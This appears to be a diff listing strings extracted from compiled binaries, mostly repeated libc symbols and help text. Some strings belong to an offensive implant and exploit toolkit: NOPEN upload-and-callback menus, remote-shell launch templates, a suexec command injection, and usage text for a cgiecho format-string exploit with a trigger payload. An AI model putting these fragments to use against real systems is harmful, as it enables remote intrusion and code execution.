+Terminate this program:         'quit' or Control-D
+quit
+exit
+Not connected; try 'help network'
+Command option error; try 'help %s'
+Command '%s' unknown; try 'help'
+ping
+reloaded on any subsequent execution.
+Successful Cmds:   %d/%d
+Usage: ping
+Rule Notice: Stripping CR/LF from end of string
+Failed to parse source network address and port for tipping.
+Uploaded Time:      %d (secs)
+-----------Tipping Config-----------
+Tipping Available:  %s
+Cmd buffer:            %d 
+ Cmd buffer full:      %d 
+ Cmd queued:           %d 
+ Cmd dropped:          %d 
+exit_alt_charset_mode
+exit_attribute_mode
+exit_ca_mode
+exit_delete_mode
+exit_insert_mode
+exit_standout_mode
+exit_underline_mode
+exit_xon_mode
+exit_am_mode
+key_exit
+key_help
+key_sexit
+key_shelp
+exit_doublewide_mode
+exit_italics_mode
+exit_leftward_mode
+exit_micro_mode
+exit_shadow_mode
+exit_subscript_mode
+exit_superscript_mode
+exit_upward_mode
+exit_pc_charset_mode
+exit_scancode_mode
+cmdch
+kcmd
+kCMD
+nanosleep
+exit
+exit
+help
+quit
+Usage: help [command]
+Displays a list of all available commands or the detailed help message for
+    Try 'help <command>' for a detailed help message for any of the
+Usage: quit or exit
+Close connections and exit.
+help
+       %s -h [ --help ]
+quit
+exit
+Command option error; try 'help %s'
+Command '%s' unknown; try 'help'
+Not connected; try 'help network'
+List all available command:     'help'
+Terminate this program:         'quit' or Control-D
+help
+ping
+Usage: ping
+Tipping Available: %s
+Rule Notice: Stripping CR/LF from end of regex
+reloaded on any subsequent execution.
+Uploaded Time:      %d (secs)
+nanosleep
+rl_executing_keymap
+_rl_pop_executing_macro
+rl_execute_next
+_rl_clean_up_for_exit
+_rl_push_executing_macro
+_rl_executing_macro
+                                      execution of the implant.
+help or ?                             Shows this command summary.
+ping                                  Tests for connectivity to sd module.
+quit or exit                          Exits.
+ping
+help
+quit
+exit
+stopping at curr = %d
+atexit
+regexec
+getexecname
+exit
+help
+_exit
+atexit
+regexec
+getexecname
+exit
+regexec
+regexec
+__cxa_atexit
+_exit
+atexit
+atexit
+regexec
+getexecname
+regexec
+__cxa_atexit
+_exit
+atexit
+regexec
+getexecname
+regexec
+__cxa_atexit
+regexec
+__cxa_atexit
+regexec
+__cxa_atexit
+atexit
+regexec
+getexecname
+exit
+help
+atexit
+_exit
+regexec
+atexit failed
+regexec
+atexit
+_exit
+atexit
+regexec
+getexecname
+_exit
+atexit
+regexec
+getexecname
+atexit
+regexec
+atexit failed
+exit
+help
+regexec
+__cxa_atexit
+atexit
+regexec
+getexecname
+_exit
+atexit
+regexec
+getexecname
+_exit
+atexit
+atexit failed
+_exit
+atexit
+atexit failed
+regexec
+__cxa_atexit
+atexit
+regexec
+getexecname
+_exit
+atexit
+regexec
+getexecname
+atexit
+exit
+atexit failed
+atexit
+atexit failed
+atexit
+regexec
+getexecname
+__cxa_atexit
+atexit failed
+regexec
+__cxa_atexit
+exit
+help
+regexec
+atexit
+exit
+help
+exit
+help
+atexit
+_exit
+regexec
+atexit
+_exit
+atexit
+_exit
+regexec
+exit
+regexec
+exit
+regexec
+atexit
+_exit
+regexec
+atexit
+_exit
+regexec
+atexit
+_exit
+regexec
+atexit
+regexec
+_exit
+atexit
+_exit
+regexec
+regexec
+_exit
+atexit
+_exit
+regexec
+atexit
+regexec
+exit
+regexec
+_exit
+_exit
+regexec
+atexit
+_exit
+atexit
+_exit
+atexit
+regexec
+regexec
+_exit
+atexit
+regexec
+_exit
+regexec
+atexit
+_exit
+_exit
+regexec
+atexit
+regexec
+_exit
+regexec
+exit
+_exit
+atexit
+exit
+_exit
+regexec
+atexit
+_exit
+regexec
+atexit
+_exit
+atexit
+regexec
+_exit
+regexec
+atexit
+_exit
+atexit
+regexec
+_exit
+atexit
+_exit
+atexit
+atexit
+regexec
+_exit
+_exit
+regexec
+atexit
+regexec
+exit
+_exit
+regexec
+atexit
+regexec
+_exit
+exit
+regexec
+_exit
+atexit
+_exit
+atexit
+exit
+Unexpected exception occurred, exiting...
+Execution time: %d seconds
+Exec format error
+Can not exec a shared library directly
+.text._ZSt17__verify_groupingPKcjRKSs
+.gnu.linkonce.t._ZNKSt10moneypunctIcLb0EE8groupingEv
+.gnu.linkonce.t._ZNKSt10moneypunctIcLb1EE8groupingEv
+.gnu.linkonce.t._ZSt14__add_groupingIcEPT_S1_S0_PKcjPKS0_S5_
+.gnu.linkonce.t._ZNKSt8numpunctIcE8groupingEv
+.gnu.linkonce.t._ZNKSt8numpunctIcE11do_groupingEv
+.gnu.linkonce.t._ZNKSt10moneypunctIcLb1EE11do_groupingEv
+.gnu.linkonce.t._ZNKSt10moneypunctIcLb0EE11do_groupingEv
+.gnu.linkonce.t._ZNKSt10moneypunctIwLb0EE8groupingEv
+.gnu.linkonce.t._ZNKSt10moneypunctIwLb1EE8groupingEv
+.gnu.linkonce.t._ZSt14__add_groupingIwEPT_S1_S0_PKcjPKS0_S5_
+.gnu.linkonce.t._ZNKSt8numpunctIwE8groupingEv
+.gnu.linkonce.t._ZNKSt8numpunctIwE11do_groupingEv
+.gnu.linkonce.t._ZNKSt10moneypunctIwLb1EE11do_groupingEv
+.gnu.linkonce.t._ZNKSt10moneypunctIwLb0EE11do_groupingEv
+regexec
+exit
+regexec
+exit
+_exit
+atexit
+regexec
+regexec
+exit
+regexec
+exit
+atexit
+_exit
+regexec
+_exit
+atexit
+_exit
+sleep
+atexit
+regexec
+atexit
+_exit
+regexec
+exit
+regexec
+atexit
+_exit
+regexec
+exit
+_exit
+atexit
+atexit
+exit
+regexec
+_exit
+regexec
+atexit
+_exit
+regexec
+atexit
+_exit
+atexit
+regexec
+regexec
+atexit
+_exit
+atexit
+regexec
+exit
+_exit
+regexec
+atexit
+_exit
+atexit
+regexec
+atexit
+_exit
+regexec
+exit
+atexit
+_exit
+regexec
+regexec
+_exit
+atexit
+_exit
+regexec
+atexit
+_exit
+atexit
+regexec
+_exit
+atexit
+regexec
+_exit
+atexit
+exit
+regexec
+_exit
+regexec
+exit
+_exit
+regexec
+atexit
+_exit
+regexec
+atexit
+_exit
+atexit
+regexec
+regexec
+_exit
+atexit
+regexec
+_exit
+atexit
+_exit
+regexec
+_exit
+regexec
+atexit
+regexec
+exit
+regexec
+atexit
+_exit
+regexec
+atexit
+atexit
+sleep
+_exit
+_exit
+atexit
+regexec
+regexec
+exit
+atexit
+_exit
+regexec
+exit
+_exit
+atexit
+regexec
+atexit
+_exit
+regexec
+regexec
+exit
+atexit
+_exit
+regexec
+usleep
+regexec
+_exit
+atexit
+execl
+execv
+usleep
+execl
+execv
+regexec
+exit
+usleep
+execl
+execv
+regexec
+exit
+usleep
+execl
+execv
+atexit
+regexec
+usleep
+execl
+execv
+regexec
+exit
+execv
+usleep
+atexit
+regexec
+execl
+_exit
+regexec
+usleep
+atexit
+execl
+execv
+usleep
+execl
+execv
+regexec
+exit
+/usr/libexec/ld-elf.so.1
+atexit
+exit
+exit
+exit@@GLIBC_2.0
+/usr/libexec/ld-elf.so.1
+atexit
+exit
+/usr/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+/usr/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/usr/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+_get_exit_frame_monitor
+regexec
+sleep
+pthread_exit
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+atexit
+pthread_exit
+sleep
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+/usr/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+/usr/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+/usr/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/usr/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/usr/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+exit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+pthread_exit
+sleep
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+pthread_exit
+sleep
+exit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+sleep
+pthread_exit
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+_get_exit_frame_monitor
+regexec
+/usr/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+sleep
+pthread_exit
+atexit
+_get_exit_frame_monitor
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+pthread_exit
+sleep
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/usr/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+pthread_exit
+sleep
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+pthread_exit
+sleep
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+/usr/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+pthread_exit
+sleep
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+pthread_exit
+sleep
+pthread_exit
+sleep
+exit
+sleep
+pthread_exit
+atexit
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+pthread_exit
+sleep
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+_get_exit_frame_monitor
+regexec
+/usr/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+pthread_exit
+sleep
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+pthread_exit
+sleep
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+sleep
+pthread_exit
+atexit
+pthread_exit
+sleep
+pthread_exit
+sleep
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+sleep
+pthread_exit
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+regexec
+/usr/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+sleep
+pthread_exit
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+/usr/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+_get_exit_frame_monitor
+regexec
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+pthread_exit
+sleep
+pthread_exit
+sleep
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+sleep
+pthread_exit
+atexit
+sleep
+pthread_exit
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+pthread_exit
+sleep
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/usr/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+_get_exit_frame_monitor
+regexec
+sleep
+pthread_exit
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/usr/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+pthread_exit
+sleep
+sleep
+pthread_exit
+atexit
+pthread_exit
+sleep
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+/libexec/ld-elf.so.1
+pthread_exit
+sleep
+regexec
+atexit
+sleep
+pthread_exit
+atexit
+regexec
+pthread_exit
+sleep
+exit
+pthread_exit
+sleep
+_exit
+atexit
+usleep
+execl
+execvp
+regexec
+_exit
+atexit
+usleep
+execl
+execvp
+regexec
+regexec
+usleep
+execl
+_exit
+execvp
+_exit
+atexit
+usleep
+execl
+execvp
+regexec
+_exit
+atexit
+usleep
+execl
+execvp
+regexec
+Cannot exec a shared library directly
+Exec format error
+__libc_atexit
+Exec format error
+execvp: 
+mapping information
+/libexec/ld-elf.so.1
+usleep
+execl
+regexec
+atexit
+_exit
+execvp
+/usr/libexec/ld-elf.so.1
+usleep
+execl
+regexec
+atexit
+_exit
+execvp
+usleep
+execl
+execlp
+_exit
+execvp
+ server will execute:
+      bytes: mapping %d, 
+down/cmdout
+Could not find/execute %s: %s
+Incompatible versions. Use a different noclient or noserver. Exiting.
+Error during connection to %s:%hu, exiting
+Ran out of addresses to attempt, exiting
+Error during setup of listener *:%hu, exiting
+-exit
+-quit
+-help
+-shell
+[alt_shell]
+-upload
+-cmdout
+-ping
+ (should add help)
+       -ping host
+       -ping [-u|-t|-i] host
+exiting...
+Executing: %s %s
+Noclient: Command we are executing... %s ...
+" >> /current/down/cmdout/scans
+Resource issues, sleeping.....
+[h]elp     - show this help
+sendcmd
+  <cmd_output id="%d">
+  </cmd_output>
+  <cmd_started txid="%d" id="%d" pid="-1">
+  </cmd_started>
+  <cmd_ended id="%d" />
+Starting NOPEN sub-shell (%s)
+Unexpectedly done shelling, range shutting down
+Done shelling, range shutting down
+Can't start the shell, range shutting down
+ping -c 1 -w 1 %s >/dev/null
+Ping string: %s
+Ping error (Got [8] bytes)
+	[1] Upload Nopen and start listener
+	[2] Upload Nopen and do callback
+	[4] Upload Nopen, using incision and ftshell, and do a callback
+xterm -hold -e sh -c 'RA=%s RP=%u LD_PRELOAD=../bin/connect.so CMD="%s" 
+Which port will we be uploading nopen on?  
+	[5] Exit
+sh -c 'UTC_OFFSET=%d RA=%s RP=%u CMD="%s" NOPENJACK=yes 
+sh -c 'RA=%s RP=%u LD_PRELOAD=../bin/connect.so CMD="%s" 
+Nopen to upload[] 
+	Nopen upload port [%d]
+	File to upload [%s]
+sh -c "ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx "
+Type DONE to quit -rawsend
+Ping error, closeing down
+exit
+got this from shell: %s
+Sleep time may be about %d seconds
+usleep
+execl
+regexec
+_exit
+execvp
+/libexec/ld-elf.so.1
+usleep
+execl
+regexec
+atexit
+_exit
+execvp
+atexit
+_exit
+exit
+regexec
+execl
+sleep
+execvp
+usleep
+/usr/libexec/ld-elf.so.1
+usleep
+execl
+regexec
+atexit
+_exit
+execvp
+help
+SUEXEC=""
+for x in /usr/local/apache/bin/suexec{,.disable}
+    SUEXEC="$x"
+if [ "$SUEXEC" ]
+cat <<"WdURzA" | "$SUEXEC" mailman mailman config_list -c -i /dev/stdin mailman
+execve() filename required.
+prepare_shellcode_fork_exec.c
+help
+execve() filename and/or executable image required.
+prepare_python_fork_exec.c
+Unable to encode executable.
+Usage: %s [--suexec] [--no-base64] [--filename <remote/path/to/exe>] [--executable <local/path/to/exe>] [--stdin <local/path/to/file to put on stdin>] [--argv argv[0] argv[1] ...] [--envp envp[0] envp[1] ...]
+--via-suexec
+--executable
+Filename and/or executable required.
+  sys.exit()
+   os.execve(fn, av, ev)
+    from time import sleep
+    sleep(sc)
+  print 'exec'
+sys.exit()
+(leak_stack) Found return address 0x%08llx at offset %d: identified '%s' executable.
+(leak_stack) No known return address found in stack data: unidentified executable.
+(leak_stack) Executable could not be identified: no target exe dict.
+Unable to set upload option.
+Unable to set upload size.
+Unable to force upload to use GET method.
+Exploit for cgiecho (part of cgiemail) giving info disclosure and memory read/write, enabling remote code execution.
+   the user full control, useful for exploring how a particular executable processes the file.
+   Exploit fprintf() to leak data from the stack. Can be used to fingerprint the target executable
+   If the symbol does not specify the target executable then "this" executable, as determined
+   Specifies a file containing name value mappings for known target executables.
+   Required if --leak-stack is to automatically determine the target executable,
+   Specifies the target executable, if known, using a name from the target exe dict.
+   This allows a guess of 78 (+10=88) to cover the three known 32-bit cPanel cgiecho executables.
+   can be avoided, and execution can potentially be gained with a single request.
+   Specifies the target word size (in bytes) of the target executable. The word size must be known for
+   processed template file. A first-stage shellcode can rewind() the file and read the payload.
+ # Do a GET request, dump stack to determine offset of format string and identify target executable:
+ # With known/guessed stack offset and word size, read copy of target executable from memory:
+ echo -n '[$exec $0<&4 2>&1]' > trigger
+Try --help for more information.
+help
+Cannot resolve symbol '%s': target executable is undetermined.
+usleep
+atexit
+execve
+usleep
+atexit
+_exit
+execve
+execve
+usleep
+__cxa_atexit
+atexit failed
+execvp: 
+Exec format error
+usleep
+execve
+execl
+_exit
+__cxa_atexit
+execvP: 
+Exec format error
+usleep
+execve
+execl
+_exit
+__cxa_atexit
+usleep
+execve
+execl
+atexit
+/libexec/ld-elf.so.1
+usleep
+execve
+atexit
+Exec format error
+atexit
+usleep
+execl
+_exit
+execve
+execl
+_exit
+sleep
+usleep
+execve
+exit
+usleep
+execve
+execl
+_exit
+__cxa_atexit
+usleep
+atexit
+_exit
+execve
+atexit
+usleep
+execl
+_exit
+execve
+cxa_atexit.c
+__new_exitfn
+/usr/libexec/pt_chown
+! "getpt: internal error: invalid exit code from pt_chown"
+</usr/libexec/getconf
+nscd_helper.c
+cannot enable executable stack as shared object requires
+cannot dynamically load executable
+only ET_DYN and ET_EXEC can be loaded
+Exec format error
+Cannot exec a shared library directly
+execvP: 
+warning, unknown root shell
+/etc/shells
+shells-XXXXX
+shells-%d
+initshells
+mapping information
+Exec format error
+usleep
+execve
+execl
+_exit
+__cxa_atexit
+usleep
+atexit
+_exit
+execve
+usleep
+execve
+execl
+_exit
+__cxa_atexit
+atexit
+usleep
+execl
+_exit
+execve
+Exec format error
+execvp: 
+usleep
+atexit
+execve
+usleep
+execve
+execl
+atexit
+_exit
+usleep
+execve
+execl
+_exit
+__cxa_atexit
+usleep
+atexit
+execve
+usleep
+execve
+execl
+_exit
+__cxa_atexit
+usleep
+atexit
+_exit
+execve
+usleep
+execve
+execl
+_exit
+__cxa_atexit
+atexit
+usleep
+execl
+execve
+only ET_DYN and ET_EXEC can be loaded
+cannot enable executable stack as shared object requires
+cannot dynamically load executable
+Exec format error
+Cannot exec a shared library directly
+/usr/libexec/pt_chown
+cannot dynamically load executable
+only ET_DYN and ET_EXEC can be loaded
+Cannot exec a shared library directly
+Exec format error
+/libexec/ld-elf.so.1
+usleep
+execve
+atexit
+execvP: 
+Exec format error
+execvP: 
+Exec format error
+atexit
+usleep
+execl
+_exit
+execve
+usleep
+execve
+atexit
+atexit failed
+/usr/libexec/ld-elf.so.1
+usleep
+execve
+atexit
+usleep
+execve
+atexit
+atexit failed
+execvP: 
+Exec format error
+usleep
+execve
+execl
+atexit
+_exit
+/libexec/ld-elf.so.1
+execve
+usleep
+atexit
+Exec format error
+Cannot exec a shared library directly
+usleep
+execve
+atexit
+usleep
+atexit
+_exit
+execve
+execvP: 
+mapping information
+Exec format error
+warning, unknown root shell
+initshells
+shells-%d
+shells-XXXXX
+/etc/shells
+usleep
+atexit
+_exit
+execve
+execvP: 
+Exec format error
+execvp: 
+Exec format error
+atexit
+usleep
+_exit
+execve
+usleep
+execve
+__cxa_atexit
+execvp: 
+Exec format error
+Exec format error
+execvp: 
+execvp: 
+Exec format error
+atexit
+usleep
+execl
+_exit
+execve
+execvp: 
+Exec format error
+/libexec/ld-elf.so.1
+usleep
+execve
+atexit
+execl
+_exit
+sleep
+usleep
+execve
+exit
+usleep
+execve
+execl
+__cxa_atexit
+regexec
+exit
+regexec
+exit
+_exit
+regexec
+atexit
+sleep
+sleep
+sleep
+sleep
+sleep
+sleep
+sleep
+sleep
+execve
+sleep
+exit
+sleep
+execve
+sleep
+exit
+sleep
+sleep
+sleep
+sleep
+execve
+sleep
+_exit
+execve
+sleep
+_exit
+execve
+sleep
+exit
+sleep
+sleep
+sleep
+execve
+sleep
+_exit
+sleep
+sleep
+execve
+sleep
+_exit
+sleep
+sleep
+sleep
+sleep
+execve
+sleep
+_exit
+execve
+sleep
+exit
+execve
+sleep
+_exit
+sleep
+execve
+sleep
+_exit
+sleep
+sleep
+sleep
+sleep
+execve
+sleep
+exit
+execve
+sleep
+exit
+sleep
+sleep
+_exit
+regexec
+atexit
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Continue to collect on processes after executing another program
+  Bind to newly executed program "%s"
+--help
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	help         display this help
+	quit         leave shell
+[helper component] QName reference
+[helper component] attribute use prohibition
+Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema located at '%s'
+Skipping duplicate attribute use prohibition '%s'
+Skipping attribute use prohibition, since it is pointless when extending a type
+Skipping attribute use prohibition, since it is pointless inside an <attributeGroup>
+Skipping pointless attribute use prohibition '%s', since a corresponding attribute use exists already in the type definition
+Failed to locate a schema at location '%s'. Skipping the import
+Internal error: xmlSchemaCheckElemPropsCorrect, type is missing... skipping validation of the value constraint
+calling xmlRegExecPushString2()
+pthread_exit
+fork_exec_new
+fork_exec
+fork_exec_merge
+exec_new
+exec
+exec_merge
+  Bind to newly executed program "%s"
+  Continue to collect on processes after executing another program
+--help
+Pbm popping %d NS
+Popping input %d
+Exec format error
+QUIT
+exec save: allocation failed
+creating execution context
+exit
+quit
+help
+	bye          leave shell
+	exit         leave shell
+	quit         leave shell
+	help         display this help
+Internal error: xmlSchemaCheckAttrValConstr, type is missing... skipping validation of value constraint
